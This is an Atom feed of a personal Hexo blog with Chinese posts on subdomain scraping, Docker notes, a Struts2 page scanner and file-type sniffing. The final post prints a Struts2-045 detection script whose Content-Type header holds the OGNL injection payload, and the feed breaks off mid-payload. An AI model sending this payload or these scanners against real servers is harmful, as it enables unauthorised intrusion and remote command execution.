<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>masker</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://phpplay.github.io/"/>
  <updated>2017-03-28T08:19:37.364Z</updated>
  <id>http://phpplay.github.io/</id>
  
  <author>
    <name>masker</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>10年</title>
    <link href="http://phpplay.github.io/2017/03/28/10%E5%B9%B4/"/>
    <id>http://phpplay.github.io/2017/03/28/10年/</id>
    <published>2017-03-28T08:16:44.000Z</published>
    <updated>2017-03-28T08:19:37.364Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="10年后，世界会是什么样子？"><a href="#10年后，世界会是什么样子？" class="headerlink" title="10年后，世界会是什么样子？"></a>10年后，世界会是什么样子？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">飞行器的普及</div><div class="line">智能AI的出现</div><div class="line">自动化的实现</div><div class="line">机械取代人工</div><div class="line">异地化的办公</div><div class="line">人工将会廉价</div><div class="line">智力劳作赛高</div><div class="line">资源枯寂加速</div><div class="line">中国将会崛起</div></pre></td></tr></table></figure>
<p>也许会有war</p>
<p>也许人类在经历过信息大爆炸后，会进入一个瓶颈期，这段时间会很长</p>
<p>但我们的征途是星辰大海</p>
]]></content>
    
    <summary type="html">
    
      &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;10年后，世界会是什么样子？&quot;&gt;&lt;a href=&quot;#10年后，世界会是什么样子？&quot; class=&quot;headerlink&quot; title=&quot;10年后，世界会是什么样子？
    
    </summary>
    
    
      <category term="life" scheme="http://phpplay.github.io/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>dnslist</title>
    <link href="http://phpplay.github.io/2017/03/26/dnslist/"/>
    <id>http://phpplay.github.io/2017/03/26/dnslist/</id>
    <published>2017-03-26T08:16:57.000Z</published>
    <updated>2017-03-26T08:22:48.481Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="dnslist"><a href="#dnslist" class="headerlink" title="dnslist"></a>dnslist</h2><p>&#160; &#160; &#160; &#160;前两天写了一个从dnslist采集二级域名的脚本，现在做个记录，这几天没有写，感觉好怪异的感觉，也许是外出了一次吧</p>
<h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">subdm_get</span><span class="params">(domain)</span>:</span></div><div class="line">    </div><div class="line">    list3 = domain.split(<span class="string">"."</span>)  </div><div class="line">    sss = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, list3.__len__())[::<span class="number">-1</span>]:</div><div class="line">        sss = sss +list3[i]+<span class="string">'/'</span>    </div><div class="line">    url = <span class="string">'http://dnslist.net/'</span> + sss</div><div class="line">    r = requests.get(url)</div><div class="line">    html = r.text</div><div class="line">    a = re.findall(<span class="string">r"&lt;a.*?href=.*?&lt;\/a&gt;"</span>,html)</div><div class="line">    l = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</div><div class="line">        url2 = i[i.find(<span class="string">'&gt;'</span>)+<span class="number">1</span>:<span class="number">-4</span>]  </div><div class="line">        l.append(url2)</div><div class="line">    <span class="keyword">return</span> l</div><div class="line">  </div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> subdm_get(sys.argv[<span class="number">1</span>]):</div><div class="line">            <span class="keyword">print</span> i</div><div class="line">        sys.exit()</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> (<span class="string">"usage: %s domain"</span> % sys.argv[<span class="number">0</span>])</div><div class="line">        sys.exit(<span class="number">-1</span>)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;dnslist&quot;&gt;&lt;a href=&quot;#dnslist&quot; class=&quot;headerlink&quot; title=&quot;dnslist&quot;&gt;&lt;/a&gt;dnslist&lt;/h2&gt;&lt;p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://phpplay.github.io/tags/python/"/>
    
      <category term="网络安全" scheme="http://phpplay.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>docker笔记</title>
    <link href="http://phpplay.github.io/2017/03/21/dockerbj/"/>
    <id>http://phpplay.github.io/2017/03/21/dockerbj/</id>
    <published>2017-03-21T02:44:19.000Z</published>
    <updated>2017-03-21T03:17:18.046Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="docker笔记"><a href="#docker笔记" class="headerlink" title="docker笔记"></a>docker笔记</h1><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h2><p><a href="https://docs.docker.com/toolbox/toolbox_install_windows/#step-2-install-docker-toolbox" target="_blank" rel="external">https://docs.docker.com/toolbox/toolbox_install_windows/#step-2-install-docker-toolbox</a></p>
<p>注意：配置用户文件夹下的.bash_profile文件<br>内容为<br>export MACHINE_STORAGE_PATH=’D:\docker’</p>
<p>注意： 不管是安装还是后面的新建，基本都似乎使用admin权限的</p>
<h2 id="2-新建"><a href="#2-新建" class="headerlink" title="2.新建"></a>2.新建</h2><p>修改start.sh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;$&#123;DOCKER_MACHINE&#125;&quot; -s &quot;D:\docker&quot;   create --engine-registry-mirror=https://docker.mirrors.ustc.edu.cn  --virtualbox-hostonly-cidr &quot;192.168.233.1/24&quot; -d  virtualbox $PROXY_ENV &quot;$&#123;VM&#125;&quot;</div></pre></td></tr></table></figure></p>
<p>在bash 使用admin权限  运行start.sh第一次可能会说没用iso文件，所以把你安装文件夹下的 boot2docker.iso 复制到   d:\docker\cache （自定义） 文件夹后，再运行start.sh就好了</p>
<p>新建命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dm   -s &quot;D:\docker&quot;   create --engine-registry-mirror=https://docker.mirrors.ustc.edu.cn  --virtualbox-hostonly-cidr &quot;192.168.233.1/24&quot; -d virtualbox     whoami</div></pre></td></tr></table></figure></p>
<p>-s    指定文件位置<br>–engine-registry-mirror   修改为国内源</p>
<p>-d virtualbox            指定vbox</p>
<p>环境变量设置</p>
<p>docker-machine env  你建的名字</p>
<p>执行返回来的最后一条语句，就可以把docker与之关联</p>
<p>docker run   hello-world                                       测试是否可以运行</p>
<p>docker info                                                    docker 的详细信息</p>
<p>可以通过ssh 登陆docker   user：docker    和  pass：tcuser  </p>
<h2 id="3-镜像"><a href="#3-镜像" class="headerlink" title="3.镜像"></a>3.镜像</h2><p>docker build   不太会用,新建镜像的意思</p>
<p>docker pull ysrc/xunfeng       下载镜像</p>
<p>sudo docker run -d -p 8000:80 -v /opt/data ysrc/xunfeng:latest    运行镜像在8000端口</p>
<p>docker image    查看镜像</p>
<p>docker ps       查看运行中的镜像</p>
<p>docker ps       会显示image的运行ID    巡风有600+M</p>
<p>docker stop     id</p>
]]></content>
    
    <summary type="html">
    
      &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;docker笔记&quot;&gt;&lt;a href=&quot;#docker笔记&quot; class=&quot;headerlink&quot; title=&quot;docker笔记&quot;&gt;&lt;/a&gt;docker笔记&lt;/h1
    
    </summary>
    
    
      <category term="docker" scheme="http://phpplay.github.io/tags/docker/"/>
    
      <category term="linux" scheme="http://phpplay.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>docker</title>
    <link href="http://phpplay.github.io/2017/03/20/docker/"/>
    <id>http://phpplay.github.io/2017/03/20/docker/</id>
    <published>2017-03-20T08:27:53.000Z</published>
    <updated>2017-03-21T03:23:33.445Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>&#160; &#160; &#160; &#160;醉了，今天研究了一天的docker，我就不该让它运行在windows中，这是个错误啊，各种配置问题，各种解决。最后只汇聚成了一句精华<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dm   -s &quot;D:\docker list&quot;   create --engine-registry-mirror=https://docker.mirrors.ustc.edu.cn --virtualbox-hostonly-cidr &quot;192.168.233.1/24&quot; -d virtualbox  xxx</div></pre></td></tr></table></figure></p>
<p>&#160; &#160; &#160; &#160;PS:老版本的docker真心不好用，其实原理就是简易的vbox么。</p>
<h2 id="docker漏洞相关"><a href="#docker漏洞相关" class="headerlink" title="docker漏洞相关"></a>docker漏洞相关</h2><p>现在的docker虚拟化才兴起，所以漏洞还是有一些的，找到一个相关的<a href="http://www.cnblogs.com/hanyifeng/p/5526799.html" target="_blank" rel="external">漏洞</a>，虚拟化这一片的洞也不少啊，还有就是git上有一些，比如CVE-2016-5195,都是用来逃逸的POC</p>
<p>代码git上就有<a href="https://github.com/gebl/dirtycow-docker-vdso" target="_blank" rel="external">code</a>.</p>
<h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p>&#160; &#160; &#160; &#160;它最大的有点就是方便，各种环境的开解部署，真心快。</p>
]]></content>
    
    <summary type="html">
    
      &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;docker&quot;&gt;&lt;a href=&quot;#docker&quot; class=&quot;headerlink&quot; title=&quot;docker&quot;&gt;&lt;/a&gt;docker&lt;/h2&gt;&lt;p&gt;&amp;#16
    
    </summary>
    
    
      <category term="docker" scheme="http://phpplay.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>hexo</title>
    <link href="http://phpplay.github.io/2017/03/16/hexo/"/>
    <id>http://phpplay.github.io/2017/03/16/hexo/</id>
    <published>2017-03-16T02:45:15.000Z</published>
    <updated>2017-03-16T03:20:54.227Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="hexo基础命令"><a href="#hexo基础命令" class="headerlink" title="hexo基础命令"></a>hexo基础命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">hexo init 初始化</div><div class="line">hexo g   生成</div><div class="line">hexo s   本地服务</div><div class="line">hexo d   上传</div><div class="line">hexo clean   清除 public  用于增删改之后</div><div class="line">hexo new draft &quot;new draft&quot;   草稿功能(私密文章，不过放到git上也无所谓了)</div><div class="line">hexo publish   草稿变成文章</div></pre></td></tr></table></figure>
<h2 id="hexo基本语法"><a href="#hexo基本语法" class="headerlink" title="hexo基本语法"></a>hexo基本语法</h2><p><strong>重要的事情说三遍</strong>，hexo上到处都要<strong>2个空格</strong>，不同于一般的mackdown<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">\#\# 标题</div><div class="line">tags  分类 多个请使用[]</div><div class="line">缩进的话可以使用&amp;\#160; &amp;\#160; &amp;\#160; &amp;\#160; 来空两格</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;hexo基础命令&quot;&gt;&lt;a href=&quot;#hexo基础命令&quot; class=&quot;headerlink&quot; title=&quot;hexo基础命令&quot;&gt;&lt;/a&gt;hexo基础命令&lt;/h2
    
    </summary>
    
    
      <category term="hexo" scheme="http://phpplay.github.io/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>目录扫描脚本</title>
    <link href="http://phpplay.github.io/2017/03/16/nscan/"/>
    <id>http://phpplay.github.io/2017/03/16/nscan/</id>
    <published>2017-03-16T01:53:35.000Z</published>
    <updated>2017-03-16T02:41:54.387Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p>&#160; &#160; &#160; &#160;一直想搞一个批量扫描工具，最近试着写一下扫描struts2，所以打算自己写一个于是就有了这个demo。   </p>
<h3 id="我的demo"><a href="#我的demo" class="headerlink" title="我的demo"></a>我的demo</h3><p>&#160; &#160; &#160; &#160;这次不再用urllib2了，因为301，302自动跳转问题有些蛋疼 -、-，所以用了requests，第一次用，我语法都没学完，直接写到昨晚2点多，因为自定义404的问题实在是不好判断，所以就找了些资料，思路大概也就是访问一个根本不可能存在的路径，和原扫描路径做比较，如果相似度大于百分之80，就直接舍弃。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> l1 != l2 <span class="keyword">and</span> <span class="string">'type'</span> <span class="keyword">in</span> r.text <span class="keyword">and</span>  difflib.SequenceMatcher(<span class="keyword">None</span>, r2.text,r.text).ratio() &lt; <span class="number">0.8</span></div></pre></td></tr></table></figure>
<pre><code>我使用了多个判断条件，首先是状态码，文件长度，type in 是为了判断是否是html，最后的那个是判断文本相似度。  
完整的模块代码如下：  
</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">action_scan</span><span class="params">(url)</span>:</span></div><div class="line">    dirs = [<span class="string">"index.action"</span>,<span class="string">"home.action"</span>,<span class="string">"login.action"</span>,<span class="string">"main.action"</span>,<span class="string">"homepage.action"</span>]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">	furl = <span class="string">'http://'</span> + url + <span class="string">':8080/'</span> + dirs[i]</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">	    r = requests.get(furl,allow_redirects = <span class="keyword">False</span>,timeout=<span class="number">3</span>)</div><div class="line">            l1 = len(r.text)</div><div class="line">            r2 = requests.get(furl+<span class="string">'233323332333'</span>,allow_redirects = <span class="keyword">False</span>,timeout=<span class="number">3</span>)</div><div class="line">            l2 = len(r2.text)</div><div class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">and</span> l1 != l2 <span class="keyword">and</span> <span class="string">'type'</span> <span class="keyword">in</span> r.text <span class="keyword">and</span>  difflib.SequenceMatcher(<span class="keyword">None</span>, r2.text,r.text).ratio() &lt; <span class="number">0.8</span>:</div><div class="line">               </div><div class="line">                <span class="keyword">print</span> furl + <span class="string">'       is ok'</span></div><div class="line">                file_object = open(<span class="string">'ok.txt'</span>, <span class="string">'a'</span>)</div><div class="line">       	        file_object.write(furl + <span class="string">'\n'</span>)</div><div class="line">	        file_object.close()</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">print</span> furl + <span class="string">'                                       is not ok'</span></div><div class="line"></div><div class="line">            </div><div class="line">        <span class="keyword">except</span> :</div><div class="line">            <span class="keyword">pass</span></div></pre></td></tr></table></figure>
<h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><p>&#160; &#160; &#160; &#160;其实如果我只扫struts2的话，只要有一个可以判断的指纹就可以了，搞得这么复杂，我也是醉了，不过这个demo稍微改一下就可以变成一个web目录扫描了，至少它扫描struts2准确性很高了  </p>
<p>&#160; &#160; &#160; &#160;接下来打算学习线程，顺便把语法补上来，否则根基太渣，容易垮掉啊。  </p>
]]></content>
    
    <summary type="html">
    
      &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;学习&quot;&gt;&lt;a href=&quot;#学习&quot; class=&quot;headerlink&quot; title=&quot;学习&quot;&gt;&lt;/a&gt;学习&lt;/h2&gt;&lt;p&gt;&amp;#160; &amp;#160; &amp;#160;
    
    </summary>
    
    
      <category term="python" scheme="http://phpplay.github.io/tags/python/"/>
    
      <category term="网络安全" scheme="http://phpplay.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>python判断网络文件类型测试脚本</title>
    <link href="http://phpplay.github.io/2017/03/14/test/"/>
    <id>http://phpplay.github.io/2017/03/14/test/</id>
    <published>2017-03-14T05:40:21.000Z</published>
    <updated>2017-03-16T02:43:08.110Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>&#160; &#160; &#160; &#160;当时想起土司一个帖子，是通过文件头判断下载文件类型的思路来做一个挖掘姬，所以就想用python写一个，所以做了些测试。</p>
<h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">typeList</span><span class="params">()</span>:</span>  </div><div class="line">    <span class="keyword">return</span> &#123;  <span class="string">"52617221"</span>: <span class="string">"rar"</span>,   <span class="string">"504B0304"</span>: <span class="string">"zip"</span> &#125;  </div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">toHex</span><span class="params">(s)</span>:</span></div><div class="line">    lst = []</div><div class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</div><div class="line">        hv = hex(ord(ch)).replace(<span class="string">'0x'</span>, <span class="string">''</span>)</div><div class="line">        <span class="keyword">if</span> len(hv) == <span class="number">1</span>:</div><div class="line">            hv = <span class="string">'0'</span>+hv</div><div class="line">        lst.append(hv)</div><div class="line">    </div><div class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x,y:x+y, lst)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line">    </div><div class="line">    response = urllib2.urlopen(<span class="string">'http://127.0.0.1:8081/test.lnk.lnk'</span>,timeout=<span class="number">5</span>)</div><div class="line">    </div><div class="line">    code = response.getcode()</div><div class="line">    <span class="keyword">print</span> code    </div><div class="line">    </div><div class="line">    <span class="comment">#print response.info()</span></div><div class="line">    </div><div class="line">    <span class="keyword">print</span>  type(response)</div><div class="line">    </div><div class="line">    html = response.read(<span class="number">3</span>)</div><div class="line">    </div><div class="line">    <span class="keyword">print</span>  type(html)</div><div class="line"> </div><div class="line">    </div><div class="line">    <span class="keyword">print</span> html</div><div class="line">    </div><div class="line">    </div><div class="line">    </div><div class="line">    ty1 =toHex(html).upper()</div><div class="line">    <span class="keyword">print</span> ty1</div><div class="line">    </div><div class="line">    <span class="keyword">if</span> ty1 == <span class="string">"526172"</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'rar'</span></div><div class="line">    <span class="keyword">elif</span> ty1 == <span class="string">"504B03"</span>:</div><div class="line">        <span class="keyword">print</span>  <span class="string">"zip"</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">"wu"</span></div><div class="line">    </div><div class="line"></div><div class="line">   <span class="comment"># print  bytes2hex(response)</span></div><div class="line">   </div><div class="line">   </div><div class="line"></div><div class="line">  </div><div class="line"><span class="keyword">except</span> urllib2.URLError,e:</div><div class="line">    <span class="keyword">pass</span></div><div class="line"><span class="string">'''        print "Failed to reach the server"</span></div><div class="line">        #print "The reason:",e.reason</div><div class="line">    elif hasattr(e,"code"):</div><div class="line">        print "The server couldn't fulfill the request"</div><div class="line">        print "Error code:",e.code</div><div class="line">        print "Return content:",e.read()</div><div class="line">else:</div><div class="line">    pass  #其他异常的处理</div><div class="line"> </div><div class="line">'''</div><div class="line"></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line">   ty=typeList()</div><div class="line">   if ty1 in ty:</div><div class="line">       print "ok"</div><div class="line">"""</div></pre></td></tr></table></figure>
<h3 id="其它测试数据"><a href="#其它测试数据" class="headerlink" title="其它测试数据"></a>其它测试数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">JPEG (jpg) FFD8FF</div><div class="line">PNG (png) 89504E47</div><div class="line">GIF (gif) 47494638</div><div class="line">TIFF (tif) 49492A00</div><div class="line">Windows Bitmap (bmp) 424D</div><div class="line">CAD (dwg) 41433130</div><div class="line">Adobe Photoshop (psd) 38425053</div><div class="line">Rich Text Format (rtf) 7B5C727466</div><div class="line">XML (xml) 3C3F786D6C</div><div class="line">HTML (html) 68746D6C3E</div><div class="line">Email [thorough only] (eml) 44656C69766572792D646174653A</div><div class="line">Outlook Express (dbx) CFAD12FEC5FD746F</div><div class="line">Outlook (pst) 2142444E</div><div class="line">MS Word/Excel (xls.or.doc) D0CF11E0</div><div class="line">MS Access (mdb) 5374616E64617264204A</div><div class="line">WordPerfect (wpd) FF575043</div><div class="line">Postscript (eps.or.ps) 252150532D41646F6265</div><div class="line">Adobe Acrobat (pdf) 255044462D312E</div><div class="line">Quicken (qdf) AC9EBD8F</div><div class="line">Windows Password (pwl) E3828596</div><div class="line">ZIP Archive (zip) 504B0304</div><div class="line">RAR Archive (rar) 52617221</div><div class="line">Wave (wav) 57415645</div><div class="line">AVI (avi) 41564920</div><div class="line">Real Audio (ram) 2E7261FD</div><div class="line">Real Media (rm) 2E524D46</div><div class="line">MPEG (mpg) 000001BA</div><div class="line">MPEG (mpg) 000001B3</div><div class="line">Quicktime (mov) 6D6F6F76</div><div class="line">Windows Media (asf) 3026B2758E66CF11</div><div class="line">MIDI (mid) 4D546864</div></pre></td></tr></table></figure>
<h3 id="测试区"><a href="#测试区" class="headerlink" title="测试区"></a>测试区</h3><div class="owl-media owl-video owl-bilibili"><embed src="http://static.hdslb.com/miniloader.swf" flashvars="aid=247371&page=1" pluginspage="http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" quality="high" allowfullscreen="true"></div>
<div id="aplayer0" class="aplayer" style="margin-bottom: 20px;"></div>
		<script>
			new APlayer({
				element: document.getElementById("aplayer0"),
				narrow: false,
				autoplay: false,
				showlrc: 0,
				music: {
					title: "她的睫毛",
					author: "周杰伦",
					url: "http://home.ustc.edu.cn/~mmmwhy/%d6%dc%bd%dc%c2%d7%20-%20%cb%fd%b5%c4%bd%de%c3%ab.mp3",
					pic: "http://home.ustc.edu.cn/~mmmwhy/jay.jpg",
				}
			});
		</script>
<embed height="415" width="544" quality="high" allowfullscreen="true" type="application/x-shockwave-flash" src="//static.hdslb.com/miniloader.swf" flashvars="aid=9057376&page=1" pluginspage="//www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash">
]]></content>
    
    <summary type="html">
    
      &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;测试&quot;&gt;&lt;a href=&quot;#测试&quot; class=&quot;headerlink&quot; title=&quot;测试&quot;&gt;&lt;/a&gt;测试&lt;/h2&gt;&lt;p&gt;&amp;#160; &amp;#160; &amp;#160;
    
    </summary>
    
    
      <category term="python" scheme="http://phpplay.github.io/tags/python/"/>
    
      <category term="网络安全" scheme="http://phpplay.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>关于struts2-045漏洞的脚本编写</title>
    <link href="http://phpplay.github.io/2017/03/14/whoami/"/>
    <id>http://phpplay.github.io/2017/03/14/whoami/</id>
    <published>2017-03-14T03:58:35.000Z</published>
    <updated>2017-03-16T02:42:42.998Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h2 id="始末"><a href="#始末" class="headerlink" title="始末"></a>始末</h2><p>&#160; &#160; &#160; &#160;struts2-045漏洞是在2017.3.7被安恒放出的，而很多公司都是在一个月以前获得的通知，所以内部圈子里面都是很早以前就开始玩了。poc在3.7日当天被放出来，所以批量检测工具也很快就被各黑阔论坛开发出来，然而这个时间段很是敏感，所以没爆什么大新闻。<br>&#160; &#160; &#160; &#160;当时自己闲着没事也写一个检测的DEMO，还是很简单的，当时还知道了一个很溜的工具<a href="https://www.getpostman.com/" target="_blank" rel="external">postman</a>。</p>
<h3 id="我的DEMO"><a href="#我的DEMO" class="headerlink" title="我的DEMO"></a>我的DEMO</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line">url=<span class="string">"http://text.com/index.action"</span></div><div class="line">req = urllib2.Request(url)</div><div class="line">req.add_header(<span class="string">'User-agent'</span>,<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>)</div><div class="line">req.add_header(<span class="string">'Content-Type'</span>,<span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo 